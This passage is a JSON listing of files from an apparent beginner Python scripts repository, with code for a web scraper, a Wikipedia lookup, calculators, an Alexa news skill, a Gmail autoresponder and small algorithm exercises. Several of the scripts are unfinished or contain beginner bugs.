          "name": "Web_Scraper.py",
          "type": "blob",
          "size": 1.0068359375,
          "content": "\"\"\"\nAuthor: Chayan Chawra\ngit: github.com/Chayan-19\nRequirements: selenium, BeautifulSoup\n\"\"\"\n\nimport requests\nfrom bs4 import BeautifulSoup\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\nimport time\n\n# url of the page we want to scrape\nurl = \"https://www.naukri.com/top-jobs-by-designations# desigtop600\"\n\n# initiating the webdriver. Parameter includes the path of the webdriver.\ndriver = webdriver.Chrome(\"./chromedriver\")\ndriver.get(url)\n\n# this is just to ensure that the page is loaded\ntime.sleep(5)\n\nhtml = driver.page_source\n\n# this renders the JS code and stores all\n# of the information in static HTML code.\n\n# Now, we could simply apply bs4 to html variable\nsoup = BeautifulSoup(html, \"html.parser\")\nall_divs = soup.find(\"div\", {\"id\": \"nameSearch\"})\njob_profiles = all_divs.find_all(\"a\")\n\n# printing top ten job profiles\ncount = 0\nfor job_profile in job_profiles:\n    print(job_profile.text)\n    count = count + 1\n    if count == 10:\n        break\n\ndriver.close()  # closing the webdriver\n"
        },
        {
          "name": "Webbrowser",
          "type": "tree",
          "content": null
        },
        {
          "name": "Wikipdedia",
          "type": "tree",
          "content": null
        },
        {
          "name": "WikipediaModule.py",
          "type": "blob",
          "size": 2.0791015625,
          "content": "\"\"\"\nCreated on Sat Jul 15 01:41:31 2017\n\n@author: Albert\n\"\"\"\nfrom __future__ import print_function\n\nimport wikipedia as wk\nfrom bs4 import BeautifulSoup\n\n\ndef wiki():\n    \"\"\"\n    Search Anything in wikipedia\n    \"\"\"\n\n    word = input(\"Wikipedia Search : \")\n    results = wk.search(word)\n    for i in enumerate(results):\n        print(i)\n    try:\n        key = int(input(\"Enter the number : \"))\n    except AssertionError:\n        key = int(input(\"Please enter corresponding article number : \"))\n\n    page = wk.page(results[key])\n    url = page.url\n    # originalTitle=page.original_title\n    pageId = page.pageid\n    # references=page.references\n    title = page.title\n    # soup=BeautifulSoup(page.content,'lxml')\n    pageLength = input(\"\"\"Wiki Page Type : 1.Full 2.Summary : \"\"\")\n    if pageLength == 1:\n        soup = fullPage(page)\n        print(soup)\n    else:\n        print(title)\n        print(\"Page Id = \", pageId)\n        print(page.summary)\n        print(\"Page Link = \", url)\n    # print \"References : \",references\n\n    pass\n\n\ndef fullPage(page):\n    soup = BeautifulSoup(page.content, \"lxml\")\n    return soup\n\n\ndef randomWiki():\n    \"\"\"\n    This function gives you a list of n number of random articles\n    Choose any article.\n    \"\"\"\n    number = input(\"No: of Random Pages : \")\n    lst = wk.random(number)\n    for i in enumerate(lst):\n        print(i)\n    try:\n        key = input(\"Enter the number : \")\n        assert key >= 0 and key < number\n    except AssertionError:\n        key = input(\"Please enter corresponding article number : \")\n\n    page = wk.page(lst[key])\n    url = page.url\n    # originalTitle=page.original_title\n    pageId = page.pageid\n    # references=page.references\n    title = page.title\n    # soup=BeautifulSoup(page.content,'lxml')\n    pageLength = input(\"\"\"Wiki Page Type : 1.Full 2.Summary : \"\"\")\n    if pageLength == 1:\n        soup = fullPage(page)\n        print(soup)\n    else:\n        print(title)\n        print(\"Page Id = \", pageId)\n        print(page.summary)\n        print(\"Page Link = \", url)\n    # print \"References : \",references\n\n    pass\n\n\n# if __name__==\"__main__\":\n#    wiki()\n"
        },
        {
          "name": "Windows_Wallpaper_Script",
          "type": "tree",
          "content": null
        },
        {
          "name": "Word_Dictionary",
          "type": "tree",
          "content": null
        },
        {
          "name": "Wordle",
          "type": "tree",
          "content": null
        },
        {
          "name": "XML",
          "type": "tree",
          "content": null
        },
        {
          "name": "XORcipher",
          "type": "tree",
          "content": null
        },
        {
          "name": "Youtube Downloader With GUI",
          "type": "tree",
          "content": null
        },
        {
          "name": "add_two_number.py",
          "type": "blob",
          "size": 0.4677734375,
          "content": "user_input = (input(\"type type 'start' to run program:\")).lower()\n\nif user_input == 'start':\n    is_game_running = True\nelse:\n    is_game_running = False\n\n\nwhile (is_game_running):\n    num1 = int(input(\"enter number 1:\"))\n    num2 = int(input(\"enter number 2:\"))\n    num3 = num1+num2\n    print(f\"sum of {num1} and {num2} is {num3}\")\n    user_input = (input(\"if you want to discontinue type 'stop':\")).lower()\n    if user_input == \"stop\":\n        is_game_running = False\n        \n"
        },
        {
          "name": "add_two_nums.py",
          "type": "blob",
          "size": 0.7255859375,
          "content": "__author__ = \"Nitkarsh Chourasia\"\n__version__ = \"1.0\"\ndef addition(\n        num1: typing.Union[int, float],\n        num2: typing.Union[int, float]\n) -> str:\n    \"\"\"A function to add two given numbers.\"\"\"\n\n    # Checking if the given parameters are numerical or not.\n    if not isinstance(num1, (int, float)):\n        return \"Please input numerical values only for num1.\"\n    if not isinstance(num2, (int, float)):\n        return \"Please input numerical values only for num2.\"\n\n    # Adding the given parameters.\n    sum_result = num1 + num2\n\n    # returning the result.\n    return f\"The sum of {num1} and {num2} is: {sum_result}\"\n)\n\nprint(addition(5, 10))  # This will use the provided parameters\nprint(addition(2, 2))\nprint(addition(-3, -5))\n"
        },
        {
          "name": "advanced_calculator.py",
          "type": "blob",
          "size": 11.10546875,
          "content": "# This is like making a package.lock file for npm package.\n# Yes, I should be making it.\n__author__ = \"Nitkarsh Chourasia\"\n__version__ = \"0.0.0\"  # SemVer # Understand more about it\n__license__ = \"MIT\"  # Understand more about it\n# Want to make it open source but how to do it?\n# Program to make a simple calculator\n# Will have to extensively work on Jarvis and local_document and MongoDb and Redis and JavaScript and CSS and DOM manipulation to understand it.\n# Will have to study maths to understand it more better.\n# How can I market gtts? Like showing used google's api? This is how can I market it?\n# Project description? What will be the project description?\n\nfrom numbers import Number\nfrom sys import exit\nimport colorama as color\nimport inquirer\nfrom gtts import gTTS\nfrom pygame import mixer, time\nfrom io import BytesIO\nfrom pprint import pprint\nimport art\nimport date\n\n\n# Find the best of best extensions for the auto generation of the documentation parts.\n# For your favourite languages like JavaScript, Python ,etc,...\n# Should be able to print date and time too.\n# Should use voice assistant for specially abled people.\n# A fully personalised calculator.\n# voice_assistant on/off , setting bool value to true or false\n\n# Is the operations valid?\n\n\n# Validation checker\nclass Calculator:\n    def __init__(self):\n        self.take_inputs()\n\n    def add(self):\n        \"\"\"summary: Get the sum of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        return self.num1 + self.num2\n\n    def sub(self):\n        \"\"\"_summary_: Get the difference of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        return self.num1 - self.num2\n\n    def multi(self):\n        \"\"\"_summary_: Get the product of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        return self.num1 * self.num2\n\n    def div(self):\n        \"\"\"_summary_: Get the quotient of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        # What do we mean by quotient?\n        return self.num1 / self.num2\n\n    def power(self):\n        \"\"\"_summary_: Get the power of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        return self.num1**self.num2\n\n    def root(self):\n        \"\"\"_summary_: Get the root of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        return self.num1 ** (1 / self.num2)\n\n    def remainer(self):\n        \"\"\"_summary_: Get the remainder of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n\n        # Do I have to use the '.' period or full_stop in the numbers?\n        return self.num1 % self.num2\n\n    def cube_root(self):\n        \"\"\"_summary_: Get the cube root of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        return self.num1 ** (1 / 3)\n\n    def cube_exponent(self):\n        \"\"\"_summary_: Get the cube exponent of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        return self.num1**3\n\n    def square_root(self):\n        \"\"\"_summary_: Get the square root of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        return self.num1 ** (1 / 2)\n\n    def square_exponent(self):\n        \"\"\"_summary_: Get the square exponent of numbers\n\n        Returns:\n            _type_: _description_\n        \"\"\"\n        return self.num1**2\n\n    def factorial(self):\n        \"\"\"_summary_: Get the factorial of numbers\"\"\"\n        pass\n\n    def list_factors(self):\n        \"\"\"_summary_: Get the list of factors of numbers\"\"\"\n        pass\n\n    def factorial(self):\n        for i in range(1, self.num + 1):\n            self.factorial = self.factorial * i  # is this right?\n\n    def LCM(self):\n        \"\"\"_summary_: Get the LCM of numbers\"\"\"\n        pass\n\n    def HCF(self):\n        \"\"\"_summary_: Get the HCF of numbers\"\"\"\n        pass\n\n    # class time: # Working with days calculator\n    def age_calculator(self):\n        \"\"\"_summary_: Get the age of the user\"\"\"\n        # This is be very accurate and precise it should include proper leap year and last birthday till now every detail.\n        # Should show the preciseness in seconds when called.\n        pass\n\n    def days_calculator(self):\n        \"\"\"_summary_: Get the days between two dates\"\"\"\n        pass\n\n    def leap_year(self):\n        \"\"\"_summary_: Get the leap year of the user\"\"\"\n        pass\n\n    def perimeter(self):\n        \"\"\"_summary_: Get the perimeter of the user\"\"\"\n        pass\n\n    class Trigonometry:\n        \"\"\"_summary_: Class enriched with all the methods to solve basic trignometric problems\"\"\"\n\n        def pythagorean_theorem(self):\n            \"\"\"_summary_: Get the pythagorean theorem of the user\"\"\"\n            pass\n\n        def find_hypotenuse(self):\n            \"\"\"_summary_: Get the hypotenuse of the user\"\"\"\n            pass\n\n        def find_base(self):\n            \"\"\"_summary_: Get the base of the user\"\"\"\n            pass\n\n        def find_perpendicular(self):\n            \"\"\"_summary_: Get the perpendicular of the user\"\"\"\n            pass\n\n    # class Logarithms:\n    # Learn more about Maths in general\n\n    def quadratic_equation(self):\n        \"\"\"_summary_: Get the quadratic equation of the user\"\"\"\n        pass\n\n    def open_system_calculator(self):\n        \"\"\"_summary_: Open the calculator present on the machine of the user\"\"\"\n        # first identify the os\n        # track the calculator\n        # add a debugging feature like error handling\n        # for linux and mac\n        # if no such found then print a message to the user that sorry dear it wasn't possible to so\n        # then open it\n\n    def take_inputs(self):\n        \"\"\"_summary_: Take the inputs from the user in proper sucession\"\"\"\n        while True:\n            while True:\n                try:\n                    # self.num1 = float(input(\"Enter The First Number: \"))\n                    # self.num2 = float(input(\"Enter The Second Number: \"))\n                    pprint(\"Enter your number\")\n                    # validation check must be done\n                    break\n                except ValueError:\n                    pprint(\"Please Enter A Valid Number\")\n                    continue\n                # To let the user to know it is time to exit.\n            pprint(\"Press 'q' to exit\")\n        # if self.num1 == \"q\" or self.num2 == \"q\":\n        #     exit()  # Some how I need to exit it\n\n    def greeting(self):\n        \"\"\"_summary_: Greet the user with using Audio\"\"\"\n        text_to_audio = \"Welcome To The Calculator\"\n        self.gtts_object = gTTS(text=text_to_audio, lang=\"en\", tld=\"co.in\", slow=False)\n        tts = self.gtts_object\n        fp = BytesIO()\n        tts.write_to_fp(fp)\n        fp.seek(0)  # Reset the BytesIO object to the beginning\n        mixer.init()\n        mixer.music.load(fp)\n        mixer.music.play()\n        while mixer.music.get_busy():\n            time.Clock().tick(10)\n\n    # Here OOP is not followed.\n    def user_name(self):\n        \"\"\"_summary_: Get the name of the user and have an option to greet him/her\"\"\"\n        self.name = input(\"Please enter your good name: \")\n        # Making validation checks here\n        text_to_audio = \"{self.name}\"\n        self.gtts_object = gTTS(text=text_to_audio, lang=\"en\", tld=\"co.in\", slow=False)\n        tts = self.gtts_object\n        fp = BytesIO()\n        tts.write_to_fp(fp)\n        fp.seek(0)  # Reset the BytesIO object to the beginning\n        mixer.init()\n        mixer.music.load(fp)\n        mixer.music.play()\n        while mixer.music.get_busy():\n            time.Clock().tick(10)\n\n    def user_name_art(self):\n        \"\"\"_summary_: Get the name of the user and have an option to show him his user name in art\"\"\"\n        # Default is to show = True, else False if user tries to disable it.\n\n        # Tell him to show the time and date\n        # print(art.text2art(self.name))\n        # print(date and time of now)\n        # Remove whitespaces from beginning and end\n        # Remove middle name and last name\n        # Remove special characters\n        # Remove numbers\n        f_name = self.name.split(\" \")[0]\n        f_name = f_name.strip()\n        # Remove every number present in it\n        # Will have to practice not logic\n        f_name = \"\".join([i for i in f_name if not i.isdigit()])\n\n        # perform string operations on it for the art to be displayed.\n        # Remove white spaces\n        # Remove middle name and last name\n        # Remove special characters\n        # Remove numbers\n        # Remove everything\n\n    class unitConversion:\n        \"\"\"_summary_: Class enriched with all the methods to convert units\"\"\"\n\n        # Do we full-stops in generating documentations?\n\n        def __init__(self):\n            \"\"\"_summary_: Initialise the class with the required attributes\"\"\"\n            self.take_inputs()\n\n        def length(self):\n            \"\"\"_summary_: Convert length units\"\"\"\n            # It should have a meter to unit and unit to meter converter\n            # Othe lengths units it should also have.\n            # Like cm to pico meter and what not\n            pass\n\n        def area(self):\n            # This will to have multiple shapes and polygons to it to improve it's area.\n            # This will to have multiple shapes and polygons to it to improve it's area.\n            # I will try to use the best of the formula to do it like the n number of polygons to be solved.\n\n            pass\n\n        def volume(self):\n            # Different shapes and polygons to it to improve it's volume.\n            pass\n\n        def mass(self):\n            pass\n\n        def time(self):\n            pass\n\n        def speed(self):\n            pass\n\n        def temperature(self):\n            pass\n\n        def data(self):\n            pass\n\n        def pressure(self):\n            pass\n\n        def energy(self):\n            pass\n\n        def power(self):\n            pass\n\n        def angle(self):\n            pass\n\n        def force(self):\n            pass\n\n        def frequency(self):\n            pass\n\n        def take_inputs(self):\n            pass\n\n    class CurrencyConverter:\n        def __init__(self):\n            self.take_inputs()\n\n        def take_inputs(self):\n            pass\n\n        def convert(self):\n            pass\n\n    class Commands:\n        def __init__(self):\n            self.take_inputs()\n\n        def previous_number(self):\n            pass\n\n        def previous_operation(self):\n            pass\n\n        def previous_result(self):\n            pass\n\n    def clear_screen(self):\n        # Do I need a clear screen?\n        # os.system(\"cls\" if os.name == \"nt\" else \"clear\")\n        # os.system(\"cls\")\n        # os.system(\"clear\")\n        pass\n\n\nif __name__ == \"__main__\":\n    operation_1 = Calculator(10, 5)\n\n    # Operations\n    # User interaction\n    # Study them properly and try to understand them.\n    # Study them properly and try to understand them in very detailed length. Please.\n    # Add a function to continually ask for input until the user enters a valid input.\n\n\n# Let's explore colorma\n# Also user log ins, and it saves user data and preferences.\n# A feature of the least priority right now.\n\n# List of features priority should be planned.\n\n\n# Documentations are good to read and understand.\n# A one stop solution is to stop and read the document.\n# It is much better and easier to understand.\n"
        },
        {
          "name": "agecalculator.py",
          "type": "blob",
          "size": 1.8486328125,
          "content": "from _datetime import datetime\nimport tkinter as tk\nfrom tkinter import ttk\nfrom _datetime import *\n\nwin = tk.Tk()\nwin.title('Age Calculate')\nwin.geometry('310x400')\n# win.iconbitmap('pic.png')    this is use extention  ico then show pic \n\n############################################ Frame ############################################\npic = tk.PhotoImage(file=r\"E:\\Python Practice\\Age_calculate\\pic.png\")\nwin.tk.call('wm','iconphoto',win._w,pic)\n\n\ncanvas=tk.Canvas(win,width=310,height=190)\ncanvas.grid()\nimage = tk.PhotoImage(file=r\"E:\\Python Practice\\Age_calculate\\pic.png\")\ncanvas.create_image(0,0,anchor='nw',image=image)\n\nframe = ttk.Frame(win)\nframe.place(x=40,y=220)\n\n\n\n############################################ Label on Frame ############################################\n\nname = ttk.Label(frame,text = 'Name : ',font = ('',12,'bold'))\nname.grid(row=0,column=0,sticky = tk.W)\n\nyear = ttk.Label(frame,text = 'Year : ',font = ('',12,'bold'))\nyear.grid(row=1,column=0,sticky = tk.W)\n\nmonth = ttk.Label(frame,text = 'Month : ',font = ('',12,'bold'))\nmonth.grid(row=2,column=0,sticky = tk.W)\n\ndate = ttk.Label(frame,text = 'Date : ',font = ('',12,'bold'))\ndate.grid(row=3,column=0,sticky = tk.W)\n\n############################################ Entry Box ############################################\nname_entry = ttk.Entry(frame,width=25)\nname_entry.grid(row=0,column=1)\nname_entry.focus()\n\nyear_entry = ttk.Entry(frame,width=25)\nyear_entry.grid(row=1,column=1,pady=5)\n\nmonth_entry = ttk.Entry(frame,width=25)\nmonth_entry.grid(row=2,column=1)\n\ndate_entry = ttk.Entry(frame,width=25)\ndate_entry.grid(row=3,column=1,pady=5)\n\n\ndef age_cal():\n    name_entry.get()\n    year_entry.get()\n    month_entry.get()\n    date_entry.get()\n    cal = datetime.today()-(int(year_entry))\n    print(cal)\n\n\nbtn = ttk.Button(frame,text='Age calculate',command=age_cal)\nbtn.grid(row=4,column=1)\n\n\n\nwin.mainloop()\n"
        },
        {
          "name": "alexa_news_headlines.py",
          "type": "blob",
          "size": 1.380859375,
          "content": "import json\nimport time\n\nimport requests\nimport unidecode\nfrom flask import Flask\nfrom flask_ask import Ask, question, statement\n\napp = Flask(__name__)\nask = Ask(app, \"/reddit_reader\")\n\n\ndef get_headlines():\n    user_pass_dict = {\"user\": \"USERNAME\", \"passwd\": \"PASSWORD\", \"api_type\": \"json\"}\n    sess = requests.Session()\n    sess.headers.update({\"User-Agent\": \"I am testing Alexa: nobi\"})\n    sess.post(\"https://www.reddit.com/api/login/\", data=user_pass_dict)\n    time.sleep(1)\n    url = \"https://reddit.com/r/worldnews/.json?limit=10\"\n    html = sess.get(url)\n    data = json.loads(html.content.decode(\"utf-8\"))\n    titles = [\n        unidecode.unidecode(listing[\"data\"][\"title\"])\n        for listing in data[\"data\"][\"children\"]\n    ]\n    titles = \"... \".join([i for i in titles])\n    return titles\n\n\n@app.route(\"/\")\ndef homepage():\n    return \"hi there!\"\n\n\n@ask.launch\ndef start_skill():\n    welcome_message = \"Hello there, would you like to hear the news?\"\n    return question(welcome_message)\n\n\n@ask.intent(\"YesIntent\")\ndef share_headlines():\n    headlines = get_headlines()\n    headline_msg = \"The current world news headlines are {}\".format(headlines)\n    return statement(headline_msg)\n\n\n@ask.intent(\"NooIntent\")\ndef no_intent():\n    bye_text = \"I am not sure why you then turned me on. Anyways, bye for now!\"\n    return statement(bye_text)\n\n\nif __name__ == \"__main__\":\n    app.run(port=8000, debug=True)\n"
        },
        {
          "name": "area_of_square_app.py",
          "type": "blob",
          "size": 4.0908203125,
          "content": "__author__ = \"Nitkarsh Chourasia\"\n__author_GitHub_profile__ = \"https://github.com/NitkarshChourasia\"\n__author_email_address__ = \"playnitkarsh@gmal.com\"\n__created_on__ = \"10/10/2021\"\n__last_updated__ = \"10/10/2021\"\n\nfrom word2number import w2n\n\n\ndef convert_words_to_number(word_str):\n    \"\"\"\n    Convert a string containing number words to an integer.\n\n    Args:\n    - word_str (str): Input string with number words.\n\n    Returns:\n    - int: Numeric equivalent of the input string.\n    \"\"\"\n    numeric_result = w2n.word_to_num(word_str)\n    return numeric_result\n\n\n# Example usage:\nnumber_str = \"two hundred fifteen\"\nresult = convert_words_to_number(number_str)\nprint(result)  # Output: 215\n\n\nclass Square:\n    def __init__(self, side=None):\n        if side is None:\n            self.ask_side()\n        # else:\n        #     self.side = float(side)\n        else:\n            if not isinstance(side, (int, float)):\n                try:\n                    side = float(side)\n                except ValueError:\n                    # return \"Invalid input for side.\"\n                    raise ValueError(\"Invalid input for side.\")\n            else:\n                self.side = float(side)\n        # Check if the result is a float and remove unnecessary zeros\n\n        self.calculate_square()\n        self.truncate_decimals()\n\n    # If ask side or input directly into the square.\n    # That can be done?\n    def calculate_square(self):\n        self.area = self.side * self.side\n        return self.area\n\n    # Want to add a while loop asking for the input.\n    # Also have an option to ask the user in true mode or in repeat mode.\n    def ask_side(self):\n        # if true bool then while if int or float then for loop.\n        # I will have to learn inheritance and polymorphism.\n        condition = 3\n        # condition = True\n        if condition == True and isinstance(condition, bool):\n            while condition:\n                n = input(\"Enter the side of the square: \")\n                self.side = float(n)\n        elif isinstance(condition, (int, float)):\n            for i in range(_=condition):\n                n = input(\"Enter the side of the square: \")\n                self.side = float(n)\n        # n = input(\"Enter the side of the square: \")\n        # self.side = float(n)\n        # return\n\n    def truncate_decimals(self):\n        return (\n            f\"{self.area:.10f}\".rstrip(\"0\").rstrip(\".\")\n            if \".\" in str(self.area)\n            else self.area\n        )\n\n    # Prettifying the output.\n\n    def calculate_perimeter(self):\n        return 4 * self.side\n\n    def calculate_perimeter_prettify(self):\n        return f\"The perimeter of the square is {self.calculate_perimeter()}.\"\n\n    def calculate_area_prettify(self):\n        return f\"The area of the square is {self.area}.\"\n\n    def truncate_decimals_prettify(self):\n        return f\"The area of the square is {self.truncate_decimals()}.\"\n\n\nif __name__ == \"__main__\":\n    output_one = Square()\n    truncated_area = output_one.truncate_decimals()\n    # print(output_one.truncate_decimals())\n    print(truncated_area)\n\n\n# add a while loop to keep asking for the user input.\n# also make sure to add a about menu to input a while loop in tkinter app.\n\n# It can use a beautiful GUI also.\n# Even validation is left.\n# What if string is provided in number? Then?\n# What if chars are provided. Then?\n# What if a negative number is provided? Then?\n# What if a number is provided in alphabets characters? Then?\n# Can it a single method have more object in it?\n\n# Also need to perform testing on it.\n# EXTREME FORM OF TESTING NEED TO BE PERFORMED ON IT.\n# Documentation is also needed.\n# Comments are also needed.\n# TYPE hints are also needed.\n\n# README.md file is also needed.\n## Which will explain the whole project.\n### Like how to use the application.\n### List down the features in explicit detail.\n### How to use different methods and classes.\n### It will also a image of the project in working state.\n### It will also have a video to the project in working state.\n\n# It should also have .exe and linux executable file.\n# It should also be installable into Windows(x86) system and if possible into Linux system also.\n"
        },
        {
          "name": "armstrongnumber.py",
          "type": "blob",
          "size": 0.4091796875,
          "content": "# Python program to check if the number is an Armstrong number or not\n\n# take input from the user\nnum = int(input(\"Enter a number: \"))\n\n# initialize sum\nsum = 0\n\n# find the sum of the cube of each digit\ntemp = num\nwhile temp > 0:\n    digit = temp % 10\n    sum += digit ** 3\n    temp //= 10\n\n# display the result\nif num == sum:\n    print(num, \"is an Armstrong number\")\nelse:\n    print(num, \"is not an Armstrong number\")\n"
        },
        {
          "name": "async_downloader",
          "type": "tree",
          "content": null
        },
        {
          "name": "automail.py",
          "type": "blob",
          "size": 1.083984375,
          "content": "#find documentation for ezgmail module at https://pypi.org/project/EZGmail/\n#simple simon says module that interacts with google API to read the subject line of an email and respond to \"Simon says:\"\n#DO NOT FORGET TO ADD CREDENTIALS.JSON AND TOKEN.JSON TO .GITIGNORE!!!\n\nimport ezgmail, re, time\n\ncheck = True\nwhile check:\n    recThreads = ezgmail.recent()\n    findEmail = re.compile(r'<(.*)@(.*)>')\n    i = 0\n    for msg in recThreads:\n        subEval = recThreads[i].messages[0].subject.split(' ')\n        sender = recThreads[i].messages[0].sender\n        if subEval[0] == 'Simon' and subEval[1] == 'says:':\n            subEval.remove('Simon')\n            subEval.remove('says:')\n            replyAddress = findEmail.search(sender).group(0).replace('<','').replace('>','')\n            replyContent = 'I am now doing ' + ' '.join(subEval)\n            ezgmail.send(replyAddress, replyContent, replyContent)\n            ezgmail._trash(recThreads[i])\n        if subEval[0] == 'ENDTASK': #remote kill command\n            check = False\n        i += 1\n    time.sleep(60) #change check frquency; default every minute"
        },
        {
          "name": "avg_xdspam_confidence.py",
          "type": "blob",
          "size": 0.3544921875,
          "content": "fh = open(\"mbox-short.txt\")\n# The 'mbox-short.txt' file can be downloaded from the link: https://www.py4e.com/code3/mbox-short.txt\nsum = 0\ncount = 0\nfor fx in fh:\n    fx = fx.rstrip()\n    if not fx.startswith(\"X-DSPAM-Confidence:\"):\n        continue\n    fy = fx[19:]\n    count = count + 1\n    sum = sum + float(fy)\nprint(\"Average spam confidence: \", sum / count)\n"
        },
        {
          "name": "backup_automater_services.py",
          "type": "blob",
          "size": 1.7373046875,
          "content": "# Script Name\t: backup_automater_services.py\n# Author\t\t\t: Craig Richards\n# Created\t\t\t: 24th October 2012\n# Last Modified\t: 13th February 2016\n# Version\t\t\t: 1.0.1\n\n# Modifications\t: 1.0.1 - Tidy up the comments and syntax\n\n# Description\t\t: This will go through and backup all my automator services workflows\n\nimport datetime  # Load the library module\nimport os  # Load the library module\nimport shutil  # Load the library module\n\ntoday = datetime.date.today()  # Get Today's date\ntodaystr = (\n    today.isoformat()\n)  # Format it so we can use the format to create the directory\n\nconfdir = os.getenv(\n    \"my_config\"\n)  # Set the variable by getting the value from the OS setting\ndropbox = os.getenv(\n    \"dropbox\"\n)  # Set the variable by getting the value from the OS setting\nconffile = \"services.conf\"  # Set the variable as the name of the configuration file\nconffilename = os.path.join(\n    confdir, conffile\n)  # Set the variable by combining the path and the file name\nsourcedir = os.path.expanduser(\n    \"~/Library/Services/\"\n)  # Source directory of where the scripts are located\n# Combine several settings to create\ndestdir = os.path.join(\n    dropbox, \"My_backups\" + \"/\" + \"Automater_services\" + todaystr + \"/\"\n)\n\n# the destination backup directory\nfor file_name in open(conffilename):  # Walk through the configuration file\n    fname = file_name.strip()  # Strip out the blank lines from the configuration file\n    if fname:  # For the lines that are not blank\n        sourcefile = os.path.join(\n            sourcedir, fname\n        )  # Get the name of the source files to backup\n        destfile = os.path.join(\n            destdir, fname\n        )  # Get the name of the destination file names\n        shutil.copytree(sourcefile, destfile)  # Copy the directories\n"
        },
        {
          "name": "balance_parenthesis.py",
          "type": "blob",
          "size": 1.07421875,
          "content": "class Stack:\n    def __init__(self):\n        self.items = []\n\n    def push(self, item):\n        self.items.append(item)\n\n    def pop(self):\n        return self.items.pop()\n\n    def is_empty(self):\n        return self.items == []\n\n    def peek(self):\n        return self.items[-1]\n\n    def display(self):\n        return self.items\n\n\ndef is_same(p1, p2):\n    if p1 == \"(\" and p2 == \")\":\n        return True\n    elif p1 == \"[\" and p2 == \"]\":\n        return True\n    elif p1 == \"{\" and p2 == \"}\":\n        return True\n    else:\n        return False\n\n\ndef is_balanced(check_string):\n    s = Stack()\n    index = 0\n    is_bal = True\n    while index < len(check_string) and is_bal:\n        paren = check_string[index]\n        if paren in \"{[(\":\n            s.push(paren)\n        else:\n            if s.is_empty():\n                is_bal = False\n            else:\n                top = s.pop()\n                if not is_same(top, paren):\n                    is_bal = False\n        index += 1\n\n    if s.is_empty() and is_bal:\n        return True\n    else:\n        return False\n\n\nprint(is_balanced(\"[((())})]\"))\n"
        },
        {
          "name": "bank_managment_system",
          "type": "tree",
          "content": null
        },
        {
          "name": "bankmanaging.db",
          "type": "blob",
          "size": 16,
          "content": null
        },
        {
          "name": "batch_file_rename.py",
          "type": "blob",
          "size": 2.3408203125,
          "content": "# batch_file_rename.py\r\n# Created: 6th August 2012\r\n\r\n\"\"\"\r\nThis will batch rename a group of files in a given directory,\r\nonce you pass the current and new extensions\r\n\"\"\"\r\n\r\n# just checking\r\n__author__ = \"Craig Richards\"\r\n__version__ = \"1.0\"\r\n\r\nimport argparse\r\nimport os\r\n\r\n\r\ndef batch_rename(work_dir, old_ext, new_ext):\r\n    \"\"\"\r\n    This will batch rename a group of files in a given directory,\r\n    once you pass the current and new extensions\r\n    \"\"\"\r\n    # files = os.listdir(work_dir)\r\n    for filename in os.listdir(work_dir):\r\n        # Get the file extension\r\n        split_file = os.path.splitext(filename)\r\n        # Unpack tuple element\r\n        root_name, file_ext = split_file\r\n        # Start of the logic to check the file extensions, if old_ext = file_ext\r\n        if old_ext == file_ext:\r\n            # Returns changed name of the file with new extention\r\n            newfile = root_name + new_ext\r\n\r\n            # Write the files\r\n            os.rename(os.path.join(work_dir, filename), os.path.join(work_dir, newfile))\r\n    print(\"rename is done!\")\r\n    print(os.listdir(work_dir))\r\n\r\n\r\ndef get_parser():\r\n    parser = argparse.ArgumentParser(\r\n        description=\"change extension of files in a working directory\"\r\n    )\r\n    parser.add_argument(\r\n        \"work_dir\",\r\n        metavar=\"WORK_DIR\",\r\n        type=str,\r\n        nargs=1,\r\n        help=\"the directory where to change extension\",\r\n    )\r\n    parser.add_argument(\r\n        \"old_ext\", metavar=\"OLD_EXT\", type=str, nargs=1, help=\"old extension\"\r\n    )\r\n    parser.add_argument(\r\n        \"new_ext\", metavar=\"NEW_EXT\", type=str, nargs=1, help=\"new extension\"\r\n    )\r\n    return parser\r\n\r\n\r\ndef main():\r\n    \"\"\"\r\n    This will be called if the script is directly invoked.\r\n    \"\"\"\r\n    # adding command line argument\r\n    parser = get_parser()\r\n    args = vars(parser.parse_args())\r\n\r\n    # Set the variable work_dir with the first argument passed\r\n    work_dir = args[\"work_dir\"][0]\r\n    # Set the variable old_ext with the second argument passed\r\n    old_ext = args[\"old_ext\"][0]\r\n    if old_ext and old_ext[0] != \".\":\r\n        old_ext = \".\" + old_ext\r\n    # Set the variable new_ext with the third argument passed\r\n    new_ext = args[\"new_ext\"][0]\r\n    if new_ext and new_ext[0] != \".\":\r\n        new_ext = \".\" + new_ext\r\n\r\n    batch_rename(work_dir, old_ext, new_ext)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n"
        },
        {
          "name": "binary search.py",
          "type": "blob",
          "size": 0.70703125,
          "content": "def binarySearchAppr (arr, start, end, x):\n# check condition\n   if end >= start:\n      mid = start + (end- start)//2\n      # If element is present at the middle\n      if arr[mid] == x:\n         return mid\n      # If element is smaller than mid\n      elif arr[mid] > x:\n         return binarySearchAppr(arr, start, mid-1, x)\n      # Else the element greator than mid\n      else:\n         return binarySearchAppr(arr, mid+1, end, x)\n   else:\n      # Element is not found in the array\n      return -1\narr = sorted(['t','u','t','o','r','i','a','l'])\nx ='r'\nresult = binarySearchAppr(arr, 0, len(arr)-1, x)\nif result != -1:\n   print (\"Element is present at index \"+str(result))\nelse:\n   print (\"Element is not present in array\")\n"
        },
        {
          "name": "binarySTree isTrue_YashV1729.Java",
          "type": "blob",
          "size": 1.5693359375,
